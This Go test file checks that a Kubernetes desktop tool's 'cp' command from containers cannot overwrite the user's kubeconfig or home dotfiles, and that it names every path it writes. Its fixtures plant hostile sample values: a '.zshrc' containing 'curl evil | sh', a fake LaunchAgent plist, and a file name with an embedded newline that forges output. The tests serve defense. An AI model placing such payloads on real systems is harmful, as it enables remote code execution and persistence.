package kubectltree_test

import (
	"archive/tar"
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/waxb/kubernites/pkg/live"
	"github.com/waxb/kubernites/pkg/live/kubectltree"
	"github.com/waxb/kubernites/pkg/live/livetest"
	"github.com/waxb/kubernites/pkg/live/write"
)

func homeCpTree(t *testing.T) (*kubectltree.Tree, *livetest.Shell, string, string) {
	t.Helper()
	f := newFake(t)
	f.shell = &livetest.Shell{}
	home := t.TempDir()
	generated := kubeconfig(t, f.URL, "stone", "shop")
	data, err := os.ReadFile(generated)
	if err != nil {
		t.Fatal(err)
	}
	kc := filepath.Join(home, ".kube", "config")
	os.MkdirAll(filepath.Dir(kc), 0o700)
	if err := os.WriteFile(kc, data, 0o600); err != nil {
		t.Fatal(err)
	}
	g := gateAt(t, write.Seamless, f, kc)
	g.Pass(write.Workloads)
	tree, err := kubectltree.New(kubectltree.Config{Kubeconfig: []string{kc}, Context: "stone", Wrap: g.WrapConfig, Local: home})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { tree.Close() })
	return tree, f.shell, home, kc
}

func TestCpDotNeverWritesTheKubeconfigOrDotfilesInHome(t *testing.T) {
	tree, shell, home, kc := homeCpTree(t)
	before := read(t, kc)
	shell.Tar = tarOf(t,
		entry{name: "app/.kube/config", body: "apiVersion: v1\nkind: Config\n# from the container\n"},
		entry{name: "app/.zshrc", body: "curl evil | sh\n"},
		entry{name: "app/Library/LaunchAgents/evil.plist", body: "<plist/>"},
	)
	res := run(t, tree, "cp web-1:/app . -n shop")
	if got := read(t, kc); got != before {
		t.Fatalf("cp replaced the Stone's own kubeconfig %s:\n%s\n%s", kc, got, res.Output)
	}
	for _, p := range []string{".zshrc", "Library/LaunchAgents/evil.plist"} {
		if _, err := os.Lstat(filepath.Join(home, p)); err == nil {
			t.Errorf("cp wrote %s in the home directory:\n%s", p, res.Output)
		}
	}
}

func TestCpNamesEveryLocalPathItWrote(t *testing.T) {
	tree, shell, _, _ := homeCpTree(t)
	keep := tree.LocalPath("keep.txt")
	os.MkdirAll(filepath.Dir(keep), 0o755)
	os.WriteFile(keep, []byte("ORIGINAL CONTENT THAT MATTERS"), 0o644)
	var full bytes.Buffer
	tw := tar.NewWriter(&full)
	tw.WriteHeader(&tar.Header{Name: "etc/keep.txt", Mode: 0o644, Size: 1000, Typeflag: tar.TypeReg})
	tw.Write(bytes.Repeat([]byte("x"), 1000))
	tw.Close()
	truncated := full.Bytes()[:512+10]
	shell.Tar = truncated
	res := run(t, tree, "cp web-1:/etc/keep.txt keep.txt -n shop")
	if got := read(t, keep); got != "ORIGINAL CONTENT THAT MATTERS" && !strings.Contains(res.Output, keep) {
		t.Fatalf("cp changed %s and did not name it:\n%s", keep, res.Output)
	}

	shell.Tar = truncated
	fresh := tree.LocalPath("fresh.txt")
	res = run(t, tree, "cp web-1:/etc/keep.txt fresh.txt -n shop")
	if _, err := os.Lstat(fresh); err == nil && !strings.Contains(res.Output, fresh) {
		t.Fatalf("a copy that failed half way left %s unnamed:\n%s", fresh, res.Output)
	}

	entries := []entry{{name: "data/evil\nWrote /etc/passwd", body: "x"}, {name: "data/emptydir/", flag: tar.TypeDir}}
	for i := range 14 {
		entries = append(entries, entry{name: fmt.Sprintf("data/f%02d", i), body: "x"})
	}
	shell.Tar = tarOf(t, entries...)
	res = run(t, tree, "cp web-1:/data many -n shop")
	many := tree.LocalPath("many")
	for _, p := range []string{filepath.Join(many, "f00"), filepath.Join(many, "f13"), filepath.Join(many, "emptydir")} {
		if _, err := os.Stat(p); err != nil {
			t.Fatalf("%s missing: %v\n%s", p, err, res.Output)
		}
		if !strings.Contains(res.Output, p) {
			t.Errorf("cp wrote %s and did not name it:\n%s", p, res.Output)
		}
	}
	for _, line := range strings.Split(res.Output, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "Wrote /etc/passwd") {
			t.Errorf("a file name from the container forged a Stone line:\n%s", res.Output)
		}
	}
}

func TestCpUploadSendsOnlyThePathTyped(t *testing.T) {
	tree, shell, _, _ := homeCpTree(t)
	typed := tree.LocalPath("notes[1].txt")
	os.MkdirAll(filepath.Dir(typed), 0o755)
	os.WriteFile(typed, []byte("the file typed"), 0o644)
	os.WriteFile(tree.LocalPath("notes1.txt"), []byte("ANOTHER FILE"), 0o644)
	shell.Dirs = []string{"/tmp"}
	res := run(t, tree, "cp notes[1].txt web-1:/tmp -n shop")
	sent := shell.Uploaded()
	if bytes.Contains(sent, []byte("ANOTHER FILE")) {
		t.Fatalf("cp sent a file other than the one typed:\n%s", res.Output)
	}
	if !bytes.Contains(sent, []byte("the file typed")) {
		t.Fatalf("cp did not send the file typed:\n%s", res.Output)
	}
}

func TestCpRelativePathsLandUnderDownloadsKubernitesAndAbsolutePathsAsTyped(t *testing.T) {
	tree, shell, home, _ := homeCpTree(t)
	downloads := filepath.Join(home, "Downloads", "Kubernites")
	shell.Tar = tarOf(t, entry{name: "etc/hosts", body: "127.0.0.1 localhost\n"})
	res := run(t, tree, "cp web-1:/etc/hosts hosts -n shop")
	if got := read(t, filepath.Join(downloads, "hosts")); got != "127.0.0.1 localhost\n" || !strings.Contains(res.Output, filepath.Join(downloads, "hosts")) {
		t.Fatalf("a relative path did not land under %s:\n%s", downloads, res.Output)
	}
	if _, err := os.Lstat(filepath.Join(home, "hosts")); err == nil {
		t.Fatal("a relative path landed in the home directory")
	}
	for typed, want := range map[string]string{"~/hosts-home": filepath.Join(home, "hosts-home"), filepath.Join(home, "elsewhere", "h"): filepath.Join(home, "elsewhere", "h")} {
		os.MkdirAll(filepath.Dir(want), 0o755)
		res := run(t, tree, "cp web-1:/etc/hosts "+typed+" -n shop")
		if got := read(t, want); got != "127.0.0.1 localhost\n" || !strings.Contains(res.Output, want) {
			t.Fatalf("%s did not land at %s:\n%s", typed, want, res.Output)
		}
	}
}

func TestCpNeverWritesDotKubeOrAConnectedKubeconfig(t *testing.T) {
	tree, shell, home, kc := homeCpTree(t)
	before := read(t, kc)
	downloads := filepath.Join(home, "Downloads", "Kubernites")
	os.MkdirAll(downloads, 0o755)
	if err := os.Symlink(filepath.Join(home, ".kube"), filepath.Join(downloads, "k")); err != nil {
		t.Fatal(err)
	}
	shell.Tar = tarOf(t, entry{name: "app/config", body: "# from the container\n"})
	for _, typed := range []string{"~/.kube", "~/.kube/config", kc, filepath.Join(home, ".kube", "fresh"), "k", "k/config"} {
		res := run(t, tree, "cp web-1:/app/config "+typed+" -n shop")
		if res.Code == 0 {
			t.Errorf("cp into %s answered 0:\n%s", typed, res.Output)
		}
	}
	if got := read(t, kc); got != before {
		t.Fatalf("cp changed the connected kubeconfig:\n%s", got)
	}
	entries, _ := os.ReadDir(filepath.Join(home, ".kube"))
	if len(entries) != 1 {
		t.Fatalf("cp wrote into ~/.kube: %v", entries)
	}
	shell.Tar = tarOf(t, entry{name: "app/.kube/config", body: "# from the container\n"}, entry{name: "app/notes.txt", body: "kept"})
	res := run(t, tree, "cp web-1:/app ~ -n shop")
	if got := read(t, kc); got != before {
		t.Fatalf("cp into the home directory replaced the kubeconfig:\n%s", res.Output)
	}
	if got := read(t, filepath.Join(home, "notes.txt")); got != "kept" {
		t.Fatalf("cp into the home directory skipped the plain file:\n%s", res.Output)
	}
}

func TestCpAsksBeforeOverwritingAnExistingLocalFile(t *testing.T) {
	tree, shell, _, _ := homeCpTree(t)
	target := tree.LocalPath("report.txt")
	os.MkdirAll(filepath.Dir(target), 0o755)
	for _, c := range []struct {
		hold   kubectltree.Hold
		answer string
		want   string
	}{
		{nil, "nobody", "ORIGINAL"},
		{func(context.Context, kubectltree.Held) bool { return false }, "no", "ORIGINAL"},
		{func(context.Context, kubectltree.Held) bool { return true }, "yes", "FROM THE CONTAINER"},
	} {
		os.WriteFile(target, []byte("ORIGINAL"), 0o644)
		shell.Tar = tarOf(t, entry{name: "tmp/report.txt", body: "FROM THE CONTAINER"})
		var asked []string
		hold := c.hold
		if hold != nil {
			tree.SetHold(func(ctx context.Context, h kubectltree.Held) bool {
				asked = append(asked, fmt.Sprintf("%+v", h))
				return hold(ctx, h)
			})
		} else {
			tree.SetHold(nil)
		}
		res := run(t, tree, "cp web-1:/tmp/report.txt report.txt -n shop")
		if got := read(t, target); got != c.want {
			t.Errorf("answered %s: %s holds %q:\n%s", c.answer, target, got, res.Output)
		}
		if hold != nil && (len(asked) != 1 || !strings.Contains(asked[0], target)) {
			t.Errorf("answered %s: asked %v", c.answer, asked)
		}
		if !strings.Contains(res.Output, target) {
			t.Errorf("answered %s: the Stone did not name %s:\n%s", c.answer, target, res.Output)
		}
	}
}

func TestTheCpConfirmNamesTheLocalSide(t *testing.T) {
	f := newFake(t)
	f.shell = &livetest.Shell{Tar: tarOf(t, entry{name: "app/a.txt", body: "a"}), Dirs: []string{"/tmp"}}
	home := t.TempDir()
	path := kubeconfig(t, f.URL, "stone", "shop")
	g := gateAt(t, write.Writes, f, path)
	g.Pass(write.Workloads)
	tree, err := kubectltree.New(kubectltree.Config{Kubeconfig: []string{path}, Context: "stone", Wrap: g.WrapConfig, Local: home})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { tree.Close() })
	var asks []string
	tree.SetHold(func(ctx context.Context, h kubectltree.Held) bool {
		return live.HoldStoneWrite(ctx, g, f.URL, h, func(a live.StoneAsk) bool {
			asks = append(asks, fmt.Sprintf("%+v", a))
			return true
		})
	})
	res := run(t, tree, "cp web-1:/app app -n shop")
	want := filepath.Join(home, "Downloads", "Kubernites", "app")
	if len(asks) == 0 || !strings.Contains(asks[0], want) {
		t.Fatalf("the CONFIRM of a cp from the container does not name %s: %v\n%s", want, asks, res.Output)
	}
	upload := filepath.Join(home, "notes.txt")
	os.WriteFile(upload, []byte("n"), 0o644)
	asks = nil
	res = run(t, tree, "cp ~/notes.txt web-1:/tmp -n shop")
	for _, a := range asks {
		if !strings.Contains(a, upload) {
			t.Fatalf("the CONFIRM of a cp into the container does not name %s: %s\n%s", upload, a, res.Output)
		}
	}
	if len(asks) == 0 {
		t.Fatalf("no CONFIRM:\n%s", res.Output)
	}
}
